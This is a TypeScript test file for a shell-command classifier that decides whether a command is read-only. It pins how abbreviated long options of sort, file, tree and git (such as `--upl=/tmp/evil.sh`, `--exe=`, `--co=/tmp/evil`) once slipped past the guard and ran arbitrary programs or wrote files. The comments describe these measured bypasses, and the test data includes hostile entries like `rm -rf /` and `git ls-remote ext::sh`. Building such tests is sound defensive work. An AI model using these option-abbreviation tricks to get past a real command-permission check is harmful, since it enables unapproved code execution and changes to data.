//   --compress-program     -> --co  (2 chars; `--c` alone is ambiguous with
//                                    `--check` on both binaries and ERRORS,
//                                    it does not run as compress-program)
//   --temporary-directory  -> --t   (1 char past `--`)
//   --compile (file)       -> --co  (2 chars; `--c` alone is ambiguous with
//                                    `--checking-printout` and ERRORS)
// ---------------------------------------------------------------------------

describe("write-flag guards see through long-option ABBREVIATION (task dd055c1d)", () => {
  // AC1: sort --output abbreviations. Artefact-confirmed on BOTH BSD sort
  // and GNU coreutils sort 9.11 (gsort): the output file was created for
  // every one of these forms, on both binaries, before this fix classified
  // them read-only.
  it.each([
    "sort --out=x.txt data.txt",
    "sort --o=x.txt data.txt",
    "sort --outp=x.txt data.txt",
    "sort --ou=x.txt data.txt",
    "sort --outpu=x.txt data.txt",
    "sort --out x.txt data.txt", // separated form
    "sort --o x.txt data.txt",
  ])("blocks the abbreviated sort output flag: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // AC2 (compress-program): every abbreviation from the measured minimum
  // (`--co`) to the full spelling. Artefact: an executed PROGRAM (a shell
  // script that touches a canary file) ran on both BSD sort and gsort when
  // invoked through `--co=./prog`.
  it.each([
    "sort --co=/tmp/evil data.txt",
    "sort --com=/tmp/evil data.txt",
    "sort --comp=/tmp/evil data.txt",
    "sort --compr=/tmp/evil data.txt",
    "sort --compre=/tmp/evil data.txt",
    "sort --compres=/tmp/evil data.txt",
    "sort --compress=/tmp/evil data.txt",
    "sort --compress-=/tmp/evil data.txt",
    "sort --compress-p=/tmp/evil data.txt",
    "sort --compress-pr=/tmp/evil data.txt",
  ])("blocks the abbreviated sort compress-program flag: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // AC2 (temporary-directory): artefact-confirmed on BSD sort — forcing an
  // external merge (`-S 1K` against 5000 lines) with `--t=./dir` produced
  // thousands of scratch files inside the named directory.
  it.each([
    "sort --t=/tmp data.txt",
    "sort --te=/tmp data.txt",
    "sort --tem=/tmp data.txt",
    "sort --temp=/tmp data.txt",
    "sort --tempo=/tmp data.txt",
    "sort --tempor=/tmp data.txt",
    "sort --tempora=/tmp data.txt",
    "sort --temporar=/tmp data.txt",
    "sort --temporary=/tmp data.txt",
    "sort --temporary-=/tmp data.txt",
    "sort --temporary-d=/tmp data.txt",
    "sort --temporary-di=/tmp data.txt",
    "sort --temporary-dir=/tmp data.txt",
    "sort --temporary-director=/tmp data.txt",
  ])("blocks the abbreviated sort temporary-directory flag: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // AC2 (file --compile): artefact-confirmed on macOS /usr/bin/file — every
  // form from `--co` up created the compiled magic-cache file (`.mgc`).
  it.each([
    "file --co -m /tmp/magic",
    "file --com -m /tmp/magic",
    "file --comp -m /tmp/magic",
    "file --compi -m /tmp/magic",
    "file --compil -m /tmp/magic",
  ])("blocks the abbreviated file compile flag: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // tree shares isOutputWriteToken with sort. Measured: real tree rejects
  // this form outright (it does not support abbreviation at all), so this
  // pins classifier-level, conservative coverage rather than a live bypass.
  it.each(["tree --o list.txt", "tree --out list.txt /dir"])(
    "blocks the abbreviated tree output flag (classifier-level; real tree rejects the form outright): %s",
    (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    },
  );

  // Quoting + abbreviation combined: the abbreviation check runs on BOTH the
  // raw and decoded arms (repo convention, fdee7d0f decision D3), so a
  // quoted abbreviated flag must block too. Exercises the decoded arm
  // specifically — the raw token alone (`--"o"=x`) is not a prefix of
  // `--output` (it contains literal quote characters), so only the decoded
  // arm (`--o=x`) can catch it; a mutation deleting the decoded arm reddens
  // this case while the plain-abbreviation cases above stay green.
  it.each(['sort --"o"=x.txt data.txt', 'sort --"co"=/tmp/evil data.txt', 'file --"co" -m /tmp/magic'])(
    "blocks a quoted abbreviated write flag: %s",
    (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    },
  );

  // AC3: negative controls. These stay read-only, and the reason is not
  // "the guard forgot them" but a conscious choice matching measured real
  // binary behaviour, enumerated here rather than left implicit.
  describe("negative controls: unaffected reads (AC3)", () => {
    // `--c` alone is measured AMBIGUOUS on real sort (between --check and
    // --compress-program) and on real file (between --checking-printout and
    // --compile): the real binary ERRORS and does not run as either
    // meaning, so it does not reach the measured-minimum threshold (2 chars)
    // and is correctly left unclassified rather than blocked. This is the
    // over-block boundary named in AC3: shortening the threshold to 1 char
    // would additionally block `--c`, which cannot actually write (it
    // cannot run at all), so the guard deliberately does not.
    it.each(["sort --c FILE", "sort --c=x FILE", "file --c -m magic"])(
      "leaves the ambiguous (real-binary-rejected) prefix unclassified: %s",
      (cmd) => {
        expect(isReadOnlyBashCommand(cmd)).toBe(true);
      },
    );

    // `--che`/`--check`-family abbreviations of file's UNRELATED read-only
    // `--checking-printout` flag are not prefixes of `--compile` (they
    // diverge at the 2nd character, 'h' vs 'o') and stay read-only.
    // Artefact-confirmed: no `.mgc` cache file was created for either form.
    it.each(["file --che -m magic", "file --checking-printout -m magic"])(
      "does not extend to file's unrelated --checking-printout family: %s",
      (cmd) => {
        expect(isReadOnlyBashCommand(cmd)).toBe(true);
      },
    );

    // sort's UNRELATED `--key`/`-k` long option (`-k`, `--key=KEYDEF`) does
    // not share a prefix with any write flag ('k' matches none of 'o', 'c',
    // 't') and stays read-only, abbreviated or not.
    it.each(["sort --k=1,1 FILE", "sort --key=1,1 FILE", "sort -k1,1 FILE"])(
      "does not extend to sort's unrelated --key family: %s",
      (cmd) => {
        expect(isReadOnlyBashCommand(cmd)).toBe(true);
      },
    );

    // sort's UNRELATED `--files0-from` long option starts with 'f', shares
    // no prefix with any of the three guarded write flags, and stays
    // read-only (already pinned above without abbreviation; repeated here
    // for AC3 completeness against the new guard specifically).
    it("does not extend to sort's unrelated --files0-from flag", () => {
      expect(isReadOnlyBashCommand("sort --files0-from=list FILE")).toBe(true);
    });
  });

  // AC4 (monotonicity): the same read-only corpus used throughout this file
  // must still classify read-only after this change — a spot check across
  // bins, not a re-run of the whole suite (the whole suite IS the full
  // monotonicity check when run before/after this diff).
  it.each([
    "sort FILE",
    "sort -n FILE",
    "sort --files0-from=list FILE",
    "sort -S 2T FILE",
    "tree DIR",
    "tree -L 2 src/",
    "file FILE",
    "file -i foo.txt",
  ])("monotonicity: still read-only after the fix: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Task 62fa0542: `isGitDangerousToken`'s pre-fix guard compared exact
// spellings only (`--upload-pack`, `--exec`, `--receive-pack`, `--output`),
// so any GNU/BSD `getopt_long` UNAMBIGUOUS ABBREVIATION of the first three
// slipped through and classified read-only while genuinely running an
// operator-named binary — a real ACE bypass:
// `git ls-remote --upl=/prog .` (down to `--u`) resolves to
// `--upload-pack=/prog` and runs `/prog`, yet the pre-fix classifier said
// read-only. `--output` was measured too and needed no change (see below).
//
// Ground truth throughout is the ARTEFACT (a canary shell script that
// appends a marker line when actually executed), not the exit code, run
// against the real git on this machine: git version 2.50.1 (Apple Git-155,
// macOS). Commands: `git ls-remote --<prefix>=<canary> <local-repo>`,
// `git fetch --<prefix>=<canary> <local-repo>`, `git push
// --<prefix>=<canary> --dry-run <local-repo> HEAD:refs/heads/probe`, and
// `git send-pack --<prefix>=<canary> --dry-run <local-repo>
// HEAD:refs/heads/probe`, from a throwaway repo + sink repo pair in the
// scratchpad. `git <sub> -h` was used first as a coarse survey, then
// every candidate flag/subcommand pair was confirmed (or refuted) against
// the real binary directly, because `-h`'s static usage synopsis omits at
// least one real, reachable option (`ls-remote`'s hidden `--exec` alias).
//
// MEASUREMENT TABLE (subcommand x flag -> shortest unambiguous prefix
// past `--`, git 2.50.1; "n/a" = flag not accepted at any prefix length):
//
//   --upload-pack:
//     ls-remote  -> 1  (--u; only `u`-prefixed option on ls-remote)
//     fetch      -> 4  (--upl; --u/--up ambiguous with --unshallow /
//                        --update-head-ok / --update-shallow, ERRORS)
//     => global minimum used (fail-closed, "ambiguous on one sub,
//        unambiguous on another -> block"): 1
//   --exec:
//     ls-remote  -> 3  (--exe; --e/--ex ambiguous with --exit-code,
//                        ERRORS; hidden legacy alias for --upload-pack,
//                        undocumented in `-h`, same execution vector)
//     fetch, status, branch, tag, remote, ls-files, ls-tree, rev-parse,
//     rev-list, describe, blame, shortlog, reflog, cat-file,
//     check-ref-format, for-each-ref, name-rev, merge-base, show-ref
//                -> n/a (every one of these "unknown option" at the full
//                        spelling; rev-parse's exit-0 echo of an unknown
//                        `--` flag back to stdout is its documented
//                        parse-helper fallback, not option recognition,
//                        confirmed: canary never ran)
//     => 3 (only reachable subcommand)
//   --receive-pack:
//     every subcommand in GIT_READ_ONLY_SUBS -> n/a (not accepted at any
//     prefix length by any of them on this git version; it is a
//     `push`/`send-pack` option). Calibrated defensively against the two
//     commands that DO accept it: push -> 5 (--rece; --rec ambiguous
//     with --recurse-submodules, ERRORS), send-pack -> 3 (--rec; --r/--re
//     ambiguous with --remote, ERRORS). Per the fail-closed rule (take
//     the minimum across measured subcommands): 3.
//   --output:
//     diff, log, show, rev-list, shortlog, blame -> n/a. Every prefix
//     shorter than the full 8-character spelling (`--o` .. `--outpu`)
//     was REJECTED (`invalid option` / `unrecognized argument` /
//     `unknown option`), canary file never created; only the exact
//     `--output` spelling writes. This option's parser does not do GNU
//     abbreviation matching at all on this git version (confirmed
//     distinct from an "ambiguous, multiple candidates" error — it is
//     "not recognized" instead). No code change: the pre-existing
//     exact-match guard is already measured-correct.
//
// OVER-BLOCK COST (disclosed, accepted — real git behavior that this fix
// now classifies NOT read-only even though it mutates nothing):
//   --upload-pack minimum (1): `git status --u` (-> --untracked-files),
//     `git ls-files --u` (-> --unmerged), `git name-rev --u` (->
//     --undefined).
//   --receive-pack minimum (3): `git ls-files --rec` and
//     `git branch --rec` (both -> the unrelated --recurse-submodules).
//   --exec minimum (3): none found (no other `exe`-prefixed flag exists
//     on any subcommand in GIT_READ_ONLY_SUBS per the `-h` survey).
// ---------------------------------------------------------------------------

describe("git guard sees through long-option ABBREVIATION (task 62fa0542)", () => {
  // --upload-pack: every unambiguous prefix from the measured minimum
  // (--u, on ls-remote) through the full spelling, glued and separated,
  // on both subcommands that accept the flag.
  it.each([
    "git ls-remote --u=/tmp/evil.sh /tmp/repo",
    "git ls-remote --up=/tmp/evil.sh /tmp/repo",
    "git ls-remote --upl=/tmp/evil.sh /tmp/repo",
    "git ls-remote --uplo=/tmp/evil.sh /tmp/repo",
    "git ls-remote --uploa=/tmp/evil.sh /tmp/repo",
    "git ls-remote --upload=/tmp/evil.sh /tmp/repo",
    "git ls-remote --upload-=/tmp/evil.sh /tmp/repo",
    "git ls-remote --upload-p=/tmp/evil.sh /tmp/repo",
    "git ls-remote --upload-pa=/tmp/evil.sh /tmp/repo",
    "git ls-remote --upload-pac=/tmp/evil.sh /tmp/repo",
    "git ls-remote --u /tmp/evil.sh /tmp/repo", // separated form
    "git ls-remote --upl /tmp/evil.sh /tmp/repo",
    // fetch: measured minimum there is 4 (--upl); shorter prefixes are
    // ALSO blocked (fail-closed, global forfeit) even though on fetch
    // itself git would already refuse --u/--up/--uplo as ambiguous.
    "git fetch --upl=/tmp/evil.sh origin",
    "git fetch --upload=/tmp/evil.sh origin",
    "git fetch --upload-pack=/tmp/evil.sh origin",
  ])("blocks the abbreviated --upload-pack form: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // --exec: measured minimum on ls-remote (the only reachable subcommand)
  // is 3 (--exe).
  it.each([
    "git ls-remote --exe=/tmp/evil.sh /tmp/repo",
    "git ls-remote --exec=/tmp/evil.sh /tmp/repo",
    "git ls-remote --exe /tmp/evil.sh /tmp/repo",
  ])("blocks the abbreviated --exec form: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // --receive-pack: not reachable on any read-only subcommand today, but
  // guarded defensively (matching the pre-fix exact-match posture); the
  // global forfeit applies the token check to every subcommand in
  // GIT_READ_ONLY_SUBS regardless of whether THAT subcommand's real
  // option table has the flag. Minimum CORRECTED to 4 (`--rece`) in this
  // round (task 62fa0542, review round 1, item 5): the original 3
  // (`--rec`) was calibrated against `git send-pack`, but `--rec` is
  // still ambiguous with `--recurse-submodules` on `git push` (the
  // reviewer's measured reference command) — `git push --rec=/x
  // --dry-run <repo> HEAD:x` errors ambiguous, `--rece=/x ...` already
  // attempts to read from the named script. `--rec` itself is
  // deliberately NOT in this list any more (see the "no longer an
  // over-block" test below).
  it.each([
    "git ls-remote --rece=/tmp/evil.sh /tmp/repo",
    "git ls-remote --receive-pack=/tmp/evil.sh /tmp/repo",
    "git fetch --rece=/tmp/evil.sh origin",
    "git status --rece=/tmp/evil.sh",
  ])("blocks the abbreviated --receive-pack form: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // Below the corrected minimum, `--rec` no longer forfeits the floor:
  // it is genuinely ambiguous on git's own receive-pack-accepting
  // commands and does not reach `--receive-pack` on this git version.
  it.each([
    "git ls-remote --rec=/tmp/evil.sh /tmp/repo",
    "git fetch --rec=/tmp/evil.sh origin",
  ])("does NOT block --rec (below the corrected --receive-pack minimum): %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(true);
  });

  // --output stays exact-match only (measured: no abbreviation accepted
  // by git on this version) — pin the existing exact-match behavior here
  // too so a mutation that deletes the --output arm is caught by THIS
  // describe block as well as the pre-existing 9d1fff1b tests.
  it.each([
    "git diff --output=/tmp/x.patch HEAD~1 HEAD",
    "git log --output=/tmp/x.txt",
  ])("still blocks the exact --output form: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // Negative control: harmless git read-only forms, including
  // unambiguous abbreviations of OTHER (non-dangerous) long options,
  // must stay read-only. `--one` for `--oneline` is measured (git
  // 2.50.1, `git log --one` behaves identically to `git log --oneline`,
  // exit 0, no ambiguity error) and explicitly named in the task brief.
  it.each([
    "git log --one",
    "git log --oneline -20",
    "git log --stat",
    "git log --no-color",
    "git diff --stat HEAD~1",
    "git show --no-patch HEAD",
    "git ls-remote --tags",
    "git ls-remote -q origin",
    "git fetch --all",
    "git fetch --prune origin",
    "git status -uno",
  ])("negative control: stays read-only: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(true);
  });

  // Item 6 (review round 1): --exec deliberately stays at minimum 3
  // (`--exe`); `--ex` is ambiguous with `--exit-code` on `git ls-remote`
  // (git 2.50.1) and genuinely does NOT execute — pin this as a
  // deliberate, test-visible line so a future tightening to 2 is a
  // conscious change, not a silent one.
  it("deliberate: --ex stays read-only, ambiguous with --exit-code on this git version", () => {
    expect(isReadOnlyBashCommand("git ls-remote --ex=/prog .")).toBe(true);
  });

  // Item 6: quoted/decoded-form rows for the new --upload-pack arm — the
  // ONLY forms that exercise the raw-or-decoded decode branch of
  // isGitDangerousToken for an abbreviated (not exact) spelling.
  it.each([
    'git ls-remote --"upl"=/tmp/evil.sh /tmp/repo',
    "git ls-remote --u'p'l=/tmp/evil.sh /tmp/repo",
  ])("blocks quoted abbreviated --upload-pack form: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // ACCEPTED over-blocking, pinned as a disclosed decision (see the
  // measurement table's OVER-BLOCK COST section above): each of these is
  // real, harmless git behavior that this fix now classifies NOT
  // read-only, because the global forfeit cannot see which subcommand a
  // token is being resolved against. Over-blocking a read is the
  // accepted direction (module design contract, top of file).
  it.each([
    "git status --u", // -> --untracked-files
    "git ls-files --u", // -> --unmerged
    "git name-rev --u HEAD", // -> --undefined
  ])("ACCEPTED over-block: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // `git ls-files --rec` / `git branch --rec` are NOT over-blocks (see
  // the "does NOT block --rec" test above and the corrected minimum):
  // real git resolves `--rec` to the unrelated, harmless
  // `--recurse-submodules` on both subcommands, and the corrected
  // --receive-pack minimum (4, `--rece`) no longer reaches it.
  it.each([
    "git ls-files --rec",
    "git branch --rec",
  ])("NOT an over-block (corrected --receive-pack minimum): %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Task 62fa0542, review round 1 (HIGH finding on 2118d30): `isBranchWriteFlag`
// compared exact spellings only, so any unambiguous GNU abbreviation of a
// `git branch` write flag fell through and classified read-only while
// genuinely mutating — `git branch --unse` really unsets the upstream,
// `GIT_EDITOR=... git branch --edi` really writes
// `branch.<name>.description` and spawns the editor, and `git branch
// --set-upstream-t=other` really sets tracking. See the measurement table
// in `isBranchWriteFlag`'s doc comment (src/runtime/read-only-bash.ts) for
// the per-flag minimum prefix and over-block audit.
// ---------------------------------------------------------------------------

describe("branch write-flag guard sees through long-option ABBREVIATION (task 62fa0542, review round 1)", () => {
  // The three flags the reviewer named explicitly, at their measured
  // minimum unambiguous prefix.
  it.each([
    "git branch --unse",
    "git branch --edi",
    "git branch --set-upstream-t=x",
  ])("blocks the reviewer-named abbreviation: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // --delete: measured minimum 1 char past `--` (`--d`), every prefix
  // from there through the full spelling. Deliberately NO positional
  // operand (`git branch --d main` would already be blocked by the
  // structural "no non-flag operand" rule regardless of this flag arm,
  // which would make the row pass even with the arm removed — the
  // bare form is what actually exercises `isBranchWriteFlag`, same
  // reasoning as the pre-existing `git branch -f` / `--force` tests).
  it.each([
    "git branch --d",
    "git branch --de",
    "git branch --del",
    "git branch --dele",
    "git branch --delet",
    "git branch --delete",
  ])("blocks the abbreviated --delete form: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // --move: measured minimum 2 chars past `--` (`--mo`); `--m` alone is
  // ambiguous with `--merged` on real git and does not reach it. Bare
  // form (no positional) for the same reason as --delete above.
  it.each([
    "git branch --mo",
    "git branch --mov",
    "git branch --move",
  ])("blocks the abbreviated --move form: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // --copy: measured minimum 3 chars past `--` (`--cop`); `--c`/`--co`
  // are ambiguous with `--create-reflog`/`--column` and do not reach it.
  // Bare form (no positional) for the same reason as --delete above.
  it.each([
    "git branch --cop",
    "git branch --copy",
  ])("blocks the abbreviated --copy form: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // --force: measured minimum 4 chars past `--` (`--forc`); `--f`/`--fo`/
  // `--for` are ambiguous with `--format` and do not reach it.
  it.each([
    "git branch --forc",
    "git branch --force",
  ])("blocks the abbreviated --force form: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // --unset-upstream: measured minimum 1 char past `--` (`--u`), unique
  // on `git branch`'s option table.
  it.each([
    "git branch --u",
    "git branch --un",
    "git branch --uns",
    "git branch --unse",
    "git branch --unset",
    "git branch --unset-",
    "git branch --unset-u",
    "git branch --unset-upstream",
  ])("blocks the abbreviated --unset-upstream form: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // --edit-description: measured minimum 1 char past `--` (`--e`), unique
  // on `git branch`'s option table.
  it.each([
    "git branch --e",
    "git branch --ed",
    "git branch --edi",
    "git branch --edit",
    "git branch --edit-d",
    "git branch --edit-description",
  ])("blocks the abbreviated --edit-description form: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // --set-upstream-to: measured minimum 13 chars past `--`
  // (`--set-upstream-`, WITH the trailing hyphen — the 12-char
  // `--set-upstream` alone is the deprecated exact alias, already an
  // exact-match entry, not an abbreviation of `-to`).
  it.each([
    "git branch --set-upstream-=x",
    "git branch --set-upstream-t=x",
    "git branch --set-upstream-to=x",
  ])("blocks the abbreviated --set-upstream-to form: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  describe("negative controls: harmless branch read forms stay read-only (AC3)", () => {
    it.each([
      "git branch",
      "git branch --list",
      "git branch --l",
      "git branch --show-current",
      "git branch --sh",
      "git branch --contains",
      "git branch --con",
      "git branch -a",
      "git branch -r",
      "git branch -v",
      "git branch --merged",
      "git branch --me",
      "git branch --no-merged",
      "git branch --no-me",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });
  });

  describe("write-flag guard sees through shell quoting (repo convention, task fdee7d0f)", () => {
    it.each([
      'git branch --"unse"',
      "git branch --uns'e'",
      'git branch --edi"t"',
      'git branch --"set-upstream-t"=x',
    ])("blocks quoted abbreviated write form: %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });
});

// ---------------------------------------------------------------------------
// Task 62fa0542, monotonicity: a corpus of git, non-git, and adversarial
// commands, each pinned with its verdict under BOTH the pre-abbreviation-fix
// classifier (`master`, a byte-for-byte snapshot of origin/master commit
// 031f154 — the branch base, no divergent commits existed yet when it was
// taken) and the current, fixed classifier (`current`). Every row carries an
// explicit assertion (review round 1, item 2): a `master: false` row asserts
// `current` is also `false` (the fix may only NARROW, never widen, what
// counts as read-only); a `master: true` row asserts the table's own
// `current` value verbatim — `true` when the fix leaves it read-only, `false`
// for the newly-blocked abbreviation-bypass rows this task closes.
//
// The 031f154 snapshot itself is NOT kept in this repo (review round 1, item
// 2: this table replaces the 954-line module-snapshot fixture
// `tests/runtime/__fixtures__/read-only-bash.master-baseline.ts`, deleted by
// this same change). Every `masterVerdict` below was generated once,
// offline, by evaluating that commit's `src/runtime/read-only-bash.ts`
// (byte-for-byte, only its relative `decodeShellWord` import path adjusted)
// against every row here, then pinned as a literal. To extend this table,
// check out commit 031f154, run the corpus through THAT commit's
// `isReadOnlyBashCommand`, and pin the printed verdicts the same way.
// ---------------------------------------------------------------------------

describe("git guard monotonicity vs origin/master (task 62fa0542)", () => {
  // [command, masterVerdict (031f154), currentVerdict (this fix)]
  const corpus: [string, boolean, boolean][] = [
    // Bare read-only git forms.
    ["git status", true, true],
    ["git status -uno", true, true],
    ["git log", true, true],
    ["git log --oneline -20", true, true],
    ["git log --one", true, true],
    ["git log --stat", true, true],
    ["git diff", true, true],
    ["git diff HEAD~1", true, true],
    ["git diff --stat HEAD~1", true, true],
    ["git show HEAD", true, true],
    ["git show --no-patch HEAD", true, true],
    ["git branch", true, true],
    ["git branch --show-current", true, true],
    ["git branch --rec", true, true],
    ["git tag", true, true],
    ["git fetch origin", true, true],
    ["git fetch --all", true, true],
    ["git fetch --prune origin", true, true],
    ["git remote -v", true, true],
    ["git remote show origin", true, true],
    ["git ls-files", true, true],
    // ACCEPTED over-block (git-guard abbreviation fix, 2118d30): --u
    // resolves to --upload-pack's global forfeit, unrelated to the
    // harmless --unmerged this real form means on ls-files.
    ["git ls-files --u", true, false],
    ["git ls-files --rec", true, true],
    ["git ls-remote origin", true, true],
    ["git ls-remote --tags", true, true],
    ["git ls-remote -q origin", true, true],
    ["git ls-tree HEAD", true, true],
    ["git rev-parse HEAD", true, true],
    ["git rev-list HEAD", true, true],
    ["git describe", true, true],
    ["git blame README.md", true, true],
    ["git shortlog", true, true],
    ["git reflog", true, true],
    ["git cat-file -p HEAD", true, true],
    ["git check-ref-format refs/heads/main", true, true],
    ["git for-each-ref", true, true],
    ["git name-rev HEAD", true, true],
    // ACCEPTED over-block, same reason as ls-files --u above.
    ["git name-rev --u HEAD", true, false],
    ["git merge-base HEAD main", true, true],
    ["git show-ref", true, true],
    // Known write forms (must stay blocked on both).
    ["git push", false, false],
    ["git push origin master", false, false],
    ["git commit -m wip", false, false],
    ["git add .", false, false],
    ["git reset --hard", false, false],
    ["git checkout master", false, false],
    ["git rebase main", false, false],
    ["git merge feature", false, false],
    ["git stash", false, false],
    ["git clean -fd", false, false],
    ["git branch -D main", false, false],
    ["git branch --delete main", false, false],
    ["git branch --set-upstream-to=origin/main", false, false],
    ["git tag v1", false, false],
    ["git remote add origin https://example.com/a.git", false, false],
    ["git fetch origin main:main", false, false],
    ["git diff --output=/tmp/x.patch HEAD~1 HEAD", false, false],
    ["git log --output=/tmp/x.txt", false, false],
    ["git rev-list --output=/tmp/x.txt HEAD", false, false],
    ["git shortlog --output=/tmp/x.txt HEAD", false, false],
    ["git blame --output=/tmp/x.txt README.md", false, false],
    ["git fetch --upload-pack=/tmp/evil.sh /tmp/repo", false, false],
    ["git fetch --upload-pack /tmp/evil.sh /tmp/repo", false, false],
    ["git ls-remote --upload-pack=/tmp/evil.sh /tmp/repo", false, false],
    ["git ls-remote ext::sh -c touch", false, false],
    ["git fetch ext::sh", false, false],
    ["git branch --edit-description", false, false],
    ["git branch -f", false, false],
    ["git reflog expire --expire=now --all", false, false],
    ["git reflog delete main@{0}", false, false],
    // Bypass class from the git-guard abbreviation fix (2118d30): master
    // says read-only (true, wrong — master pre-dates that fix); the
    // current classifier blocks it.
    ["git ls-remote --u=/tmp/evil.sh /tmp/repo", true, false],
    ["git ls-remote --upl=/tmp/evil.sh /tmp/repo", true, false],
    ["git ls-remote --exe=/tmp/evil.sh /tmp/repo", true, false],
    ["git fetch --upl=/tmp/evil.sh origin", true, false],
    ["git ls-remote --rece=/tmp/evil.sh /tmp/repo", true, false],
    // Below the CORRECTED --receive-pack minimum (4, review round 1, item
    // 5): --rec is genuinely ambiguous on git's own receive-pack-accepting
    // commands and does not reach it — master and current agree (true),
    // this is not part of the bypass class.
    ["git ls-remote --rec=/tmp/evil.sh /tmp/repo", true, true],
    ["git status --rec=/tmp/evil.sh", true, true],
    // Bypass class from THIS review round's branch-flag abbreviation fix:
    // master says read-only (true, wrong — master pre-dates ALL
    // abbreviation fixes, including 2118d30's); the current classifier
    // blocks it. Deliberately bare (no positional operand) for --delete/
    // --move/--copy: the positional forms are already blocked by the
    // pre-existing structural rule on BOTH master and current, so they
    // would not distinguish this fix from a no-op.
    ["git branch --unse", true, false],
    ["git branch --edi", true, false],
    ["git branch --set-upstream-t=x", true, false],
    ["git branch --d", true, false],
    ["git branch --mo", true, false],
    ["git branch --cop", true, false],
    ["git branch --forc", true, false],
    ["git branch --set-upstream-=x", true, false],
    // Negative controls for the branch fix: harmless abbreviations of
    // OTHER (non-write) branch flags, unaffected on both.
    ["git branch --l", true, true],
    ["git branch --sh", true, true],
    ["git branch --con", true, true],
    ["git branch --me", true, true],
    ["git branch --no-me", true, true],
    // Non-git read-only and write commands, to confirm the table reflects
    // the WHOLE classifier, not just the git guard.
    ["ls -la /tmp", true, true],
    ["cat /etc/hosts", true, true],
    ["sort FILE", true, true],
    ["sort --co=/tmp/evil data.txt", false, false],
    ["rm -rf /", false, false],
    ["find . -name '-delete'", false, false],
  ];

  it.each(corpus)("monotonic and pinned: %s (master=%s, current=%s)", (cmd, masterVerdict, currentVerdict) => {
    // Every row is checked against the table's own pinned `currentVerdict`
    // — not just "narrower than master" — so a row that should stay `true`
    // and a row that should newly become `false` are both caught if the
    // classifier drifts either way.
    expect(isReadOnlyBashCommand(cmd)).toBe(currentVerdict);
    // The monotonicity invariant itself, kept as a live assertion (not
    // just an artifact of how the table was generated): current may only
    // narrow (true -> false relative to master), never widen.
    if (masterVerdict === false) {
      expect(currentVerdict).toBe(false);
    }
  });

  it("the bypass classes closed by this task are a strict narrowing, not a no-op: master allowed them, the fix blocks them", () => {
    // The full, explicit set of rows above where master said read-only
    // (true, the bug) and current now blocks (false) — both the
    // pre-existing git-guard abbreviation fix (2118d30) and this round's
    // branch-flag abbreviation fix.
    const bypassForms = [
      "git ls-files --u",
      "git name-rev --u HEAD",
      "git ls-remote --u=/tmp/evil.sh /tmp/repo",
      "git ls-remote --upl=/tmp/evil.sh /tmp/repo",
      "git ls-remote --exe=/tmp/evil.sh /tmp/repo",
      "git fetch --upl=/tmp/evil.sh origin",
      "git ls-remote --rece=/tmp/evil.sh /tmp/repo",
      "git branch --unse",
      "git branch --edi",
      "git branch --set-upstream-t=x",
      "git branch --d",
      "git branch --mo",
      "git branch --cop",
      "git branch --forc",
      "git branch --set-upstream-=x",
    ];
    const tabled = new Set(corpus.filter(([, m, c]) => m === true && c === false).map(([cmd]) => cmd));
    // The explicit list above must be exactly the master=true/current=false
    // rows in the table — keeps this test from silently drifting out of
    // sync with the table it is meant to summarize.
    expect(new Set(bypassForms)).toEqual(tabled);
    // masterVerdict for every one of these is pinned `true` in the table
    // above (the 031f154 snapshot is not imported at runtime any more —
    // see the file-header comment); only the CURRENT classifier's verdict
    // is exercised live here.
    for (const cmd of bypassForms) {
      expect(isReadOnlyBashCommand(cmd)).toBe(false); // post-fix: BLOCK
    }
  });
});
